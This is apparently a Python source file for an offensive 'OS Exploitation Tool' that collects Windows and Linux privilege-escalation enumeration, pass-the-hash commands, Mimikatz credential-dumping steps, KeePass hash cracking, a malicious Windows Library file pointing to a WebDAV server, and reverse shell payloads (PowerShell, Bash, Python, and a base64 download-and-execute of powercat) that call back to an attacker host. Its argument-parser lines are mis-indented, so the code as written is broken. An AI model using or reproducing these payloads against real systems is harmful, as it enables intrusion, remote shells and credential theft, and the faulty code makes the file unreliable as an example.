#!/usr/bin/env python3
import subprocess
import argparse
import sys
import os
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from input_validator import InputValidator
from credential_manager import CredentialManager
from base_tool import BaseTool

class OSExploits(BaseTool):
    def __init__(self):
        super().__init__('os_exploits', 'OS Exploitation Tool')
        self.validator = InputValidator()
        self.cred_manager = CredentialManager()

    def windows_service_enum(self, target, timeout):
        """Enumerate Windows services for privilege escalation"""
        self.add_result('info', f'Enumerating Windows services on {target}')
        
        powershell_commands = [
            "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}",
            "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select Name,DisplayName,ServiceName",
            "sc query"
        ]
        
        for cmd in powershell_commands:
            print(f"[*] Running: {cmd}")
            try:
                if self.target == "localhost":
                    result = subprocess.run(["powershell", "-Command", cmd], 
                                          capture_output=True, text=True, timeout=self.timeout)
                    if result.stdout:
                        print(f"[+] Results:\n{result.stdout}")
                else:
                    print(f"[*] Command for remote execution: {cmd}")
            except Exception as e:
                print(f"[-] Command failed: {e}")

    def windows_scheduled_tasks(self, target, timeout):
        """Enumerate Windows scheduled tasks"""
        self.add_result('info', f'Enumerating scheduled tasks on {target}')
        
        commands = [
            "Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Select TaskName,Author,Actions",
            "schtasks /query /fo LIST /v"
        ]
        
        for cmd in commands:
            print(f"[*] Running: {cmd}")
            try:
                if self.target == "localhost":
                    result = subprocess.run(["powershell", "-Command", cmd], 
                                          capture_output=True, text=True, timeout=self.timeout)
                    if result.stdout:
                        print(f"[+] Results:\n{result.stdout}")
                else:
                    print(f"[*] Command for remote execution: {cmd}")
            except Exception as e:
                print(f"[-] Command failed: {e}")

    def windows_dll_hijacking_check(self):
        """Check for DLL hijacking opportunities"""
        print(f"[*] Checking for DLL hijacking opportunities")
        
        # Common DLL hijacking locations
        dll_paths = [
            "C:\\Windows\\System32",
            "C:\\Windows\\SysWOW64", 
            "C:\\Program Files",
            "C:\\Program Files (x86)"
        ]
        
        print(f"[+] DLL Search Order:")
        print(f"    1. Application directory")
        print(f"    2. System directory")
        print(f"    3. 16-bit system directory")
        print(f"    4. Windows directory")
        print(f"    5. Current directory")
        print(f"    6. PATH environment variable")
        
        # Check PATH environment
        try:
            if self.target == "localhost":
                result = subprocess.run(["powershell", "-Command", "$env:PATH"], 
                                      capture_output=True, text=True, timeout=self.timeout)
                if result.stdout:
                    print(f"[+] PATH Environment:\n{result.stdout}")
        except Exception as e:
            print(f"[-] PATH check failed: {e}")

    def windows_pass_the_hash(self, username, ntlm_hash):
        """Demonstrate Pass-the-Hash attack techniques"""
        # Validate NTLM hash format
        if not self.validator.validate_hash(ntlm_hash, 'ntlm'):
            self.add_result('error', f'Invalid NTLM hash format: {ntlm_hash}')
            return
            
        self.add_result('info', f'Pass-the-Hash attack examples for {username}')
        
        pth_commands = [
            f"impacket-psexec -hashes 00000000000000000000000000000000:{ntlm_hash} {username}@{self.target}",
            f"impacket-wmiexec -hashes 00000000000000000000000000000000:{ntlm_hash} {username}@{self.target}",
            f"smbclient \\\\\\\\{self.target}\\\\C$ -U {username} --pw-nt-hash {ntlm_hash}",
            f"evil-winrm -i {self.target} -u {username} -H {ntlm_hash}"
        ]
        
        print(f"[+] Pass-the-Hash commands:")
        for cmd in pth_commands:
            print(f"    {cmd}")

    def windows_keepass_enum(self):
        """Enumerate KeePass databases"""
        print(f"[*] Searching for KeePass databases")
        
        search_commands = [
            "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
            "dir C:\\*.kdbx /s /b 2>nul",
            "for /r C:\\ %i in (*.kdbx) do @echo %i 2>nul"
        ]
        
        print(f"[+] KeePass search commands:")
        for cmd in search_commands:
            print(f"    {cmd}")
        
        print(f"[+] KeePass cracking workflow:")
        print(f"    1. keepass2john Database.kdbx > keepass.hash")
        print(f"    2. Remove 'Database:' from hash file")
        print(f"    3. hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt")

    def windows_mimikatz_commands(self):
        """Display Mimikatz commands for credential extraction"""
        print(f"[*] Mimikatz credential extraction commands")
        
        mimikatz_commands = [
            "privilege::debug",
            "token::elevate", 
            "lsadump::sam",
            "sekurlsa::logonpasswords",
            "sekurlsa::wdigest",
            "sekurlsa::kerberos",
            "sekurlsa::tspkg"
        ]
        
        print(f"[+] Mimikatz command sequence:")
        for i, cmd in enumerate(mimikatz_commands, 1):
            print(f"    {i}. {cmd}")

    def linux_privilege_escalation(self):
        """Linux privilege escalation enumeration"""
        print(f"[*] Linux privilege escalation enumeration")
        
        linux_commands = [
            ("sudo -l", "Check sudo permissions"),
            ("find / -perm -u=s -type f 2>/dev/null", "Find SUID binaries"),
            ("find / -perm -g=s -type f 2>/dev/null", "Find SGID binaries"),
            ("ls -la /etc/cron*", "Check cron jobs"),
            ("crontab -l", "User cron jobs"),
            ("cat /etc/passwd", "System users"),
            ("ps aux | grep root", "Root processes"),
            ("netstat -tulpn", "Network connections"),
            ("find / -writable -type d 2>/dev/null", "Writable directories")
        ]
        
        print(f"[+] Linux enumeration commands:")
        for cmd, desc in linux_commands:
            print(f"    {desc}: {cmd}")

    def linux_cronjob_enum(self):
        """Enumerate Linux cron jobs"""
        print(f"[*] Enumerating Linux cron jobs")
        
        cron_locations = [
            "/etc/crontab",
            "/etc/cron.d/",
            "/etc/cron.daily/",
            "/etc/cron.hourly/",
            "/etc/cron.monthly/",
            "/etc/cron.weekly/",
            "/var/spool/cron/crontabs/"
        ]
        
        print(f"[+] Cron job locations to check:")
        for location in cron_locations:
            print(f"    {location}")
        
        print(f"[+] Cron enumeration commands:")
        print(f"    ls -la /etc/cron*")
        print(f"    cat /etc/crontab")
        print(f"    crontab -l")
        print(f"    sudo crontab -l")
        
        print(f"[+] Process monitoring with pspy:")
        print(f"    ./pspy64 -pf -i 1000")

    def generate_reverse_shell_payloads(self, lhost, lport):
        """Generate reverse shell payloads"""
        # Validate inputs
        if not self.validator.validate_ip(lhost) and not self.validator.validate_hostname(lhost):
            self.add_result('error', f'Invalid host: {lhost}')
            return
        
        if not self.validator.validate_port(lport):
            self.add_result('error', f'Invalid port: {lport}')
            return
            
        self.add_result('info', f'Generating reverse shell payloads for {lhost}:{lport}')
        
        payloads = {
            "PowerShell": f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
            
            "PowerShell Base64": f'powershell -enc {self.encode_powershell_command(f"IEX(New-Object System.Net.WebClient).DownloadString(\'http://{lhost}/powercat.ps1\');powercat -c {lhost} -p {lport} -e powershell")}',
            
            "Bash": f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            
            "Python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
        }
        
        print(f"[+] Reverse shell payloads:")
        for name, payload in payloads.items():
            print(f"    {name}:")
            print(f"        {payload[:100]}...")

    def encode_powershell_command(self, command):
        """Encode PowerShell command to base64"""
        import base64
        encoded = base64.b64encode(command.encode('utf-16le')).decode()
        return encoded

    def windows_library_file_attack(self, webdav_server):
        """Generate Windows Library file for client-side attack"""
        print(f"[*] Generating Windows Library file attack")
        
        library_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>1</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://{webdav_server}</url> 
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>'''
        
        print(f"[+] Windows Library file content:")
        print(library_content)
        
        print(f"[+] WebDAV server setup:")
        print(f"    mkdir /home/kali/servers/webdav")
        print(f"    wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/servers/webdav")

    def add_custom_args(self, parser):
        """Add tool-specific arguments"""
        parser.add_argument("target", nargs='?', default="localhost", help="Target IP or hostname")
    parser.add_argument("--windows-services", action="store_true", help="Enumerate Windows services")
    parser.add_argument("--windows-tasks", action="store_true", help="Enumerate scheduled tasks")
    parser.add_argument("--dll-hijacking", action="store_true", help="Check DLL hijacking opportunities")
    parser.add_argument("--pass-the-hash", help="Pass-the-Hash with NTLM hash")
    parser.add_argument("--username", default="administrator", help="Username for PTH")
    parser.add_argument("--keepass", action="store_true", help="KeePass enumeration")
    parser.add_argument("--mimikatz", action="store_true", help="Mimikatz commands")
    parser.add_argument("--linux-privesc", action="store_true", help="Linux privilege escalation")
    parser.add_argument("--linux-cron", action="store_true", help="Linux cron job enumeration")
    parser.add_argument("--reverse-shell", help="Generate reverse shells (format: IP:PORT)")
    parser.add_argument("--library-attack", help="Windows Library file attack (WebDAV server IP)")
    parser.add_argument("--all", action="store_true", help="Run all applicable tests")
    parser.add_argument("--timeout", type=int, default=10, help="Command timeout")
    
    def run(self, args):
        """Main execution method"""
        try:
            target = self.validate_target(args.target)
        except ValueError as e:
            self.add_result('error', str(e))
            return
    
        if args.all or args.windows_services:
            self.windows_service_enum(target, args.timeout)
            
        if args.all or args.windows_tasks:
            self.windows_scheduled_tasks(target, args.timeout)
            
        if args.all or args.dll_hijacking:
            self.windows_dll_hijacking_check()
            
        if args.pass_the_hash:
            self.windows_pass_the_hash(args.username, args.pass_the_hash)
            
        if args.all or args.keepass:
            self.windows_keepass_enum()
            
        if args.all or args.mimikatz:
            self.windows_mimikatz_commands()
            
        if args.all or args.linux_privesc:
            self.linux_privilege_escalation()
            
        if args.all or args.linux_cron:
            self.linux_cronjob_enum()
            
        if args.reverse_shell:
            try:
                lhost, lport = args.reverse_shell.split(':')
                self.generate_reverse_shell_payloads(lhost, int(lport))
            except ValueError:
                self.add_result('error', 'Invalid format for reverse shell. Use IP:PORT')
                
        if args.library_attack:
            self.windows_library_file_attack(args.library_attack)

def main():
    tool = OSExploits()
    tool.execute()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exploitation interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)